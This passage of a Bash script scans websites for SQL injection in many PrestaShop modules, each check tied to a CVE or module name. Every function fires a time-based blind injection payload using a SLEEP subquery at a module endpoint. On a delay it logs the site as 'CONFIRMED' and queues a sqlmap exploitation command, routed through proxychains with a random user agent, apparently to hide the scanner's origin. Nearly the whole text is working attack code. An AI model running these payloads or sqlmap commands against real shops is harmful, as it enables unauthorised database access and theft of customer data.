    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "email time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/m/apmarketplace/passwordrecovery\" --data=\"email=1&submit_reset_pwd=\" -p email --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# CVE-2025-69633: advancedpopupcreator (fromController)
# ============================================
check_cve_2025_69633() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2025-69633"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] advancedpopupcreator — fromController time${NC}"

    local CHK_HTTP=$(curl -sk -o /dev/null -w "%{http_code}" -m 8 -L "${BASE_URL}/modules/advancedpopupcreator/config.xml" 2>/dev/null)
    if [ "$CHK_HTTP" = "404" ] || [ "$CHK_HTTP" = "403" ]; then
        echo -e "${RED}  Module not found${NC}"
        return
    fi

    local CTRL_DUR=$(time_check "${BASE_URL}/module/advancedpopupcreator/popup" "POST" "updateVisits=1&fromController=index" "Referer: ${BASE_URL}/" "2")
    if [ "$CTRL_DUR" -ge "$THRESHOLD" ]; then
        echo -e "${RED}  Baseline too slow (${CTRL_DUR}s), skipping${NC}"
        return
    fi

    local DUR=$(time_check "${BASE_URL}/module/advancedpopupcreator/popup" "POST" "updateVisits=1&fromController=1\"+AND+(SELECT+1337+FROM+(SELECT(SLEEP(${SLEEP_SEC})))abcd)+AND+\"1" "Referer: ${BASE_URL}/" "$SLEEP_SEC")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "fromController time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/module/advancedpopupcreator/popup\" --data=\"updateVisits=1&fromController=1\" -p fromController --technique=T --dbms=MySQL --prefix='\"' --suffix='-- -' --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# CVE-2023-27639: tshirtecommerce (type=svg RCE/info)
# ============================================
check_cve_2023_27639() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2023-27639"

    echo -e "\n${YELLOW}[${CVE}] tshirtecommerce — ajax.php file read${NC}"

    local BODY=$(body_check "${BASE_URL}/modules/tshirtecommerce/ajax.php?type=svg" "GET")
    if echo "$BODY" | grep -qi "svg\|xml\|path\|<\!DOCTYPE\|file"; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "ajax.php type=svg returns data (len=${#BODY})"
    else
        log_safe "$DOMAIN" "$CVE" "no data returned"
    fi
}

# ============================================
# CVE-2018-11548: bamegamenu (code)
# ============================================
check_cve_2018_11548() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2018-11548"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] bamegamenu — code time${NC}"

    local CHK_HTTP=$(curl -sk -o /dev/null -w "%{http_code}" -m 8 -L "${BASE_URL}/modules/bamegamenu/" 2>/dev/null)
    if [ "$CHK_HTTP" = "404" ] || [ "$CHK_HTTP" = "403" ]; then
        echo -e "${RED}  Module not found${NC}"
        return
    fi

    local DUR=$(time_check "${BASE_URL}/modules/bamegamenu/ajax_phpcode.php?code=1'+AND+(SELECT+1+FROM+(SELECT+SLEEP(${SLEEP_SEC}))a)--+-" "GET")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "code time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/modules/bamegamenu/ajax_phpcode.php?code=1\" -p code --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# CVE-2023-46349: pk_customlinks (id)
# ============================================
check_cve_2023_46349() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2023-46349"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] pk_customlinks — id time${NC}"

    local CHK_HTTP=$(curl -sk -o /dev/null -w "%{http_code}" -m 8 -L "${BASE_URL}/modules/pk_customlinks/ajax.php" 2>/dev/null)
    if [ "$CHK_HTTP" = "404" ] || [ "$CHK_HTTP" = "403" ]; then
        echo -e "${RED}  Module not found${NC}"
        return
    fi

    local DUR=$(time_check "${BASE_URL}/modules/pk_customlinks/ajax.php?id=1'+AND+(SELECT+1+FROM+(SELECT+SLEEP(${SLEEP_SEC}))a)--+-" "GET")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "id time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/modules/pk_customlinks/ajax.php?id=1\" -p id --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# CVE-2023-50026: hsmultiaccessoriespro (id_products)
# ============================================
check_cve_2023_50026() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2023-50026"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] hsmultiaccessoriespro — id_products time${NC}"

    local CHK_HTTP=$(curl -sk -o /dev/null -w "%{http_code}" -m 8 -L "${BASE_URL}/modules/hsmultiaccessoriespro/" 2>/dev/null)
    if [ "$CHK_HTTP" = "404" ] || [ "$CHK_HTTP" = "403" ]; then
        echo -e "${RED}  Module not found${NC}"
        return
    fi

    local DUR=$(time_check "${BASE_URL}/modules/hsmultiaccessoriespro/ajax_accessories.php?id_products=1'+AND+(SELECT+1+FROM+(SELECT+SLEEP(${SLEEP_SEC}))a)--+-" "GET")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "id_products time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/modules/hsmultiaccessoriespro/ajax_accessories.php?id_products=1\" -p id_products --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# CVE-2023-50028: blockslidingcart (id)
# ============================================
check_cve_2023_50028() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2023-50028"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] blockslidingcart — id time${NC}"

    local CHK_HTTP=$(curl -sk -o /dev/null -w "%{http_code}" -m 8 -L "${BASE_URL}/modules/blockslidingcart/" 2>/dev/null)
    if [ "$CHK_HTTP" = "404" ] || [ "$CHK_HTTP" = "403" ]; then
        echo -e "${RED}  Module not found${NC}"
        return
    fi

    local DUR=$(time_check "${BASE_URL}/modules/blockslidingcart/ajax.php?action=getCart&id=1'+AND+(SELECT+1+FROM+(SELECT+SLEEP(${SLEEP_SEC}))a)--+-" "GET")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "id time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/modules/blockslidingcart/ajax.php?action=getCart&id=1\" -p id --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# CVE-2024-25843: ba_importer (id)
# ============================================
check_cve_2024_25843() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2024-25843"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] ba_importer — id time${NC}"

    local CHK_HTTP=$(curl -sk -o /dev/null -w "%{http_code}" -m 8 -L "${BASE_URL}/modules/ba_importer/" 2>/dev/null)
    if [ "$CHK_HTTP" = "404" ] || [ "$CHK_HTTP" = "403" ]; then
        echo -e "${RED}  Module not found${NC}"
        return
    fi

    local DUR=$(time_check "${BASE_URL}/modules/ba_importer/ajax.php" "POST" "action=import&id=1'+AND+(SELECT+1+FROM+(SELECT+SLEEP(${SLEEP_SEC}))a)--+-")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "id time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/modules/ba_importer/ajax.php\" --data=\"action=import&id=1\" -p id --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# CVE-2024-28391: quickproducttable (search)
# ============================================
check_cve_2024_28391() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2024-28391"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] quickproducttable — search time${NC}"

    local CHK_HTTP=$(curl -sk -o /dev/null -w "%{http_code}" -m 8 -L "${BASE_URL}/modules/quickproducttable/" 2>/dev/null)
    if [ "$CHK_HTTP" = "404" ] || [ "$CHK_HTTP" = "403" ]; then
        echo -e "${RED}  Module not found${NC}"
        return
    fi

    local DUR=$(time_check "${BASE_URL}/modules/quickproducttable/ajax.php?action=getSearch&search=test'+AND+(SELECT+1+FROM+(SELECT+SLEEP(${SLEEP_SEC}))a)--+-" "GET")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "search time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/modules/quickproducttable/ajax.php?action=getSearch&search=test\" -p search --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# CVE-2024-28392: pscartabandonmentpro (email_id)
# ============================================
check_cve_2024_28392() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2024-28392"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] pscartabandonmentpro — email_id time${NC}"

    local CHK_HTTP=$(curl -sk -o /dev/null -w "%{http_code}" -m 8 -L "${BASE_URL}/modules/pscartabandonmentpro/" 2>/dev/null)
    if [ "$CHK_HTTP" = "404" ] || [ "$CHK_HTTP" = "403" ]; then
        echo -e "${RED}  Module not found${NC}"
        return
    fi

    local DUR=$(time_check "${BASE_URL}/module/pscartabandonmentpro/UnsubscribeJob?email_id=1'+AND+(SELECT+1+FROM+(SELECT+SLEEP(${SLEEP_SEC}))a)--+-" "GET")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "email_id time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/module/pscartabandonmentpro/UnsubscribeJob?email_id=1\" -p email_id --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# CVE-2024-33266: deliveryorderautoupdate (lang)
# ============================================
check_cve_2024_33266() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2024-33266"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] deliveryorderautoupdate — lang time${NC}"

    local CHK_HTTP=$(curl -sk -o /dev/null -w "%{http_code}" -m 8 -L "${BASE_URL}/modules/deliveryorderautoupdate/ajax_email.php?lang=1" 2>/dev/null)
    if [ "$CHK_HTTP" = "404" ] || [ "$CHK_HTTP" = "403" ]; then
        echo -e "${RED}  Module not found${NC}"
        return
    fi

    local DUR=$(time_check "${BASE_URL}/modules/deliveryorderautoupdate/ajax_email.php?lang=1+AND+SLEEP(${SLEEP_SEC})" "GET")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "lang time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/modules/deliveryorderautoupdate/ajax_email.php?lang=1\" -p lang --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# CVE-2024-33269: flashsales (id)
# ============================================
check_cve_2024_33269() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2024-33269"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] flashsales — id time${NC}"

    local CHK_HTTP=$(curl -sk -o /dev/null -w "%{http_code}" -m 8 -L "${BASE_URL}/modules/flashsales/ajax.php" 2>/dev/null)
    if [ "$CHK_HTTP" = "404" ] || [ "$CHK_HTTP" = "403" ]; then
        echo -e "${RED}  Module not found${NC}"
        return
    fi

    local DUR=$(time_check "${BASE_URL}/modules/flashsales/ajax.php?action=getFlashSales&token=flashsales&id=1'+AND+(SELECT+1+FROM+(SELECT+SLEEP(${SLEEP_SEC}))a)--+-" "GET")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "id time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/modules/flashsales/ajax.php?action=getFlashSales&token=flashsales&id=1\" -p id --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# CVE-2024-36680: pkfacebook (email)
# ============================================
check_cve_2024_36680() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2024-36680"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] pkfacebook — email time${NC}"

    local CHK_HTTP=$(curl -sk -o /dev/null -w "%{http_code}" -m 8 -L "${BASE_URL}/modules/pkfacebook/facebookConnect.php" 2>/dev/null)
    if [ "$CHK_HTTP" = "404" ] || [ "$CHK_HTTP" = "403" ]; then
        echo -e "${RED}  Module not found${NC}"
        return
    fi

    local DUR=$(time_check "${BASE_URL}/modules/pkfacebook/facebookConnect.php" "POST" "email=test%40test.com'+AND+(SELECT+1+FROM+(SELECT+SLEEP(${SLEEP_SEC}))a)--+-")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "email time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/modules/pkfacebook/facebookConnect.php\" --data=\"email=test@test.com\" -p email --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# blocklayered: layered_price_slider
# ============================================
check_blocklayered_sqli() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="blocklayered-sqli"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] blocklayered — layered_price_slider time${NC}"

    local CHK_HTTP=$(curl -sk -o /dev/null -w "%{http_code}" -m 8 -L "${BASE_URL}/modules/blocklayered/blocklayered-ajax.php" 2>/dev/null)
    if [ "$CHK_HTTP" = "404" ] || [ "$CHK_HTTP" = "403" ]; then
        echo -e "${RED}  Module not found${NC}"
        return
    fi

    local DUR=$(time_check "${BASE_URL}/modules/blocklayered/blocklayered-ajax.php?layered_price_slider=1'+AND+(SELECT+1+FROM+(SELECT+SLEEP(${SLEEP_SEC}))a)--+-" "GET")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "layered_price_slider time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/modules/blocklayered/blocklayered-ajax.php?layered_price_slider=1\" -p layered_price_slider --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# azendo_send_cart: data[0][value]
# ============================================
check_azendo_send_cart_sqli() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="azendo-send-cart-sqli"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] azendo_send_cart — data[0][value] time${NC}"

    local CHK_HTTP=$(curl -sk -o /dev/null -w "%{http_code}" -m 8 -L "${BASE_URL}/modules/azendo_send_cart/psajax.php" 2>/dev/null)
    if [ "$CHK_HTTP" = "404" ] || [ "$CHK_HTTP" = "403" ]; then
        echo -e "${RED}  Module not found${NC}"
        return
    fi

    local DUR=$(time_check "${BASE_URL}/modules/azendo_send_cart/psajax.php" "POST" "data%5B0%5D%5Bvalue%5D=1'+AND+(SELECT+1+FROM+(SELECT+SLEEP(${SLEEP_SEC}))a)--+-")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "data[0][value] time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/modules/azendo_send_cart/psajax.php\" --data=\"data[0][value]=1\" -p \"data[0][value]\" --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# filterproductspro: params[searcher][22][3_22_0]
# ============================================
check_filterproductspro_sqli() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="filterproductspro-sqli"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] filterproductspro — params[searcher] time${NC}"

    local CHK_HTTP=$(curl -sk -o /dev/null -w "%{http_code}" -m 8 -L "${BASE_URL}/modules/filterproductspro/" 2>/dev/null)
    if [ "$CHK_HTTP" = "404" ] || [ "$CHK_HTTP" = "403" ]; then
        echo -e "${RED}  Module not found${NC}"
        return
    fi

    local DUR=$(time_check "${BASE_URL}/module/filterproductspro/actions" "POST" "params%5Bsearcher%5D%5B22%5D%5B3_22_0%5D=1'+AND+(SELECT+1+FROM+(SELECT+SLEEP(${SLEEP_SEC}))a)--+-")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "params[searcher] time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/module/filterproductspro/actions\" --data=\"params[searcher][22][3_22_0]=1\" -p \"params[searcher][22][3_22_0]\" --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# gsnippetsreviews: iId
# ============================================
check_gsnippetsreviews_sqli() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="gsnippetsreviews-sqli"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] gsnippetsreviews — iId time${NC}"

    local CHK_HTTP=$(curl -sk -o /dev/null -w "%{http_code}" -m 8 -L "${BASE_URL}/modules/gsnippetsreviews/ws-gsnippetsreviews.php" 2>/dev/null)
    if [ "$CHK_HTTP" = "404" ] || [ "$CHK_HTTP" = "403" ]; then
        echo -e "${RED}  Module not found${NC}"
        return
    fi

    local DUR=$(time_check "${BASE_URL}/modules/gsnippetsreviews/ws-gsnippetsreviews.php?iId=1'+AND+(SELECT+1+FROM+(SELECT+SLEEP(${SLEEP_SEC}))a)--+-" "GET")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "iId time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/modules/gsnippetsreviews/ws-gsnippetsreviews.php?iId=1\" -p iId --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# ifeedback: star
# ============================================
check_ifeedback_sqli() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="ifeedback-sqli"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] ifeedback — star time${NC}"

    local CHK_HTTP=$(curl -sk -o /dev/null -w "%{http_code}" -m 8 -L "${BASE_URL}/modules/ifeedback/actions.php" 2>/dev/null)
    if [ "$CHK_HTTP" = "404" ] || [ "$CHK_HTTP" = "403" ]; then
        echo -e "${RED}  Module not found${NC}"
        return
    fi

    local DUR=$(time_check "${BASE_URL}/modules/ifeedback/actions.php?star=1'+AND+(SELECT+1+FROM+(SELECT+SLEEP(${SLEEP_SEC}))a)--+-" "GET")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "star time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/modules/ifeedback/actions.php?star=1\" -p star --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# jxadvancedfilter: feature_2
# ============================================
check_jxadvancedfilter_sqli() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="jxadvancedfilter-sqli"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] jxadvancedfilter — feature_2 time${NC}"

    local CHK_HTTP=$(curl -sk -o /dev/null -w "%{http_code}" -m 8 -L "${BASE_URL}/modules/jxadvancedfilter/jxadvancedfilter-ajax.php" 2>/dev/null)
    if [ "$CHK_HTTP" = "404" ] || [ "$CHK_HTTP" = "403" ]; then
        echo -e "${RED}  Module not found${NC}"
        return
    fi

    local DUR=$(time_check "${BASE_URL}/modules/jxadvancedfilter/jxadvancedfilter-ajax.php?feature_2=1'+AND+(SELECT+1+FROM+(SELECT+SLEEP(${SLEEP_SEC}))a)--+-" "GET")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "feature_2 time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/modules/jxadvancedfilter/jxadvancedfilter-ajax.php?feature_2=1\" -p feature_2 --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# kbgdpr: rand
# ============================================
check_kbgdpr_sqli() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2024-8465"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] kbgdpr — rand time${NC}"

    local CHK_HTTP=$(curl -sk -o /dev/null -w "%{http_code}" -m 8 -L "${BASE_URL}/module/kbgdpr/gdprrequest" 2>/dev/null)
    if [ "$CHK_HTTP" = "404" ] || [ "$CHK_HTTP" = "403" ]; then
        echo -e "${RED}  Module not found${NC}"
        return
    fi

    local DUR=$(time_check "${BASE_URL}/module/kbgdpr/gdprrequest" "POST" "action=gdprRequest&rand=1'+AND+(SELECT+1+FROM+(SELECT+SLEEP(${SLEEP_SEC}))a)--+-")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "rand time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/module/kbgdpr/gdprrequest\" --data=\"action=gdprRequest&rand=1\" -p rand --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# leoproductsearch: q
# ============================================
check_leoproductsearch_sqli() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="leoproductsearch-sqli"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] leoproductsearch — q time${NC}"

    local CHK_HTTP=$(curl -sk -o /dev/null -w "%{http_code}" -m 8 -L "${BASE_URL}/module/leoproductsearch/index.php" 2>/dev/null)
    if [ "$CHK_HTTP" = "404" ] || [ "$CHK_HTTP" = "403" ]; then
        echo -e "${RED}  Module not found${NC}"
        return
    fi

    local DUR=$(time_check "${BASE_URL}/module/leoproductsearch/index.php?q=1'+AND+(SELECT+1+FROM+(SELECT+SLEEP(${SLEEP_SEC}))a)--+-" "GET")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "q time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/module/leoproductsearch/index.php?q=1\" -p q --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# searchbyfeatures: feature[2]
# ============================================
check_searchbyfeatures_sqli() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="searchbyfeatures-sqli"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] searchbyfeatures — feature[2] time${NC}"

    local CHK_HTTP=$(curl -sk -o /dev/null -w "%{http_code}" -m 8 -L "${BASE_URL}/module/searchbyfeatures/search" 2>/dev/null)
    if [ "$CHK_HTTP" = "404" ] || [ "$CHK_HTTP" = "403" ]; then
        echo -e "${RED}  Module not found${NC}"
        return
    fi

    local DUR=$(time_check "${BASE_URL}/module/searchbyfeatures/search?feature%5B2%5D=1'+AND+(SELECT+1+FROM+(SELECT+SLEEP(${SLEEP_SEC}))a)--+-" "GET")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "feature[2] time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/module/searchbyfeatures/search?feature[2]=1\" -p \"feature[2]\" --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# vatnumber: id_country
# ============================================
check_vatnumber_sqli() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="vatnumber-sqli"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] vatnumber — id_country time${NC}"

    local CHK_HTTP=$(curl -sk -o /dev/null -w "%{http_code}" -m 8 -L "${BASE_URL}/modules/vatnumber/ajax.php" 2>/dev/null)
    if [ "$CHK_HTTP" = "404" ] || [ "$CHK_HTTP" = "403" ]; then
        echo -e "${RED}  Module not found${NC}"
        return
    fi

    local DUR=$(time_check "${BASE_URL}/modules/vatnumber/ajax.php?id_country=1'+AND+(SELECT+1+FROM+(SELECT+SLEEP(${SLEEP_SEC}))a)--+-" "GET")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "id_country time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/modules/vatnumber/ajax.php?id_country=1\" -p id_country --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
# smartblog: id_post (different from CVE-2021-37538 day)
# ============================================
check_smartblog_id_post_sqli() {
    local BASE_URL="$1"
    local DOMAIN="$2"
    local CVE="CVE-2020-36972"
    local VULNS=0

    echo -e "\n${YELLOW}[${CVE}] smartblog — id_post time${NC}"

    local DUR=$(time_check "${BASE_URL}/module/smartblog/details?id_post=1'+AND+(SELECT+1+FROM+(SELECT+SLEEP(${SLEEP_SEC}))a)--+-" "GET")
    if [ "$DUR" -ge "$THRESHOLD" ]; then
        log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "id_post time-based sleep=${DUR}s"
        VULNS=$((VULNS+1))
        add_sqlmap "proxychains4 -q python3 /root/sqlmap/sqlmap.py -u \"${BASE_URL}/module/smartblog/details?id_post=1\" -p id_post --technique=T --dbms=MySQL --level=2 --risk=2 --batch --random-agent"
    fi

    [ "$VULNS" -eq 0 ] && log_safe "$DOMAIN" "$CVE" "no injection detected"
}

# ============================================
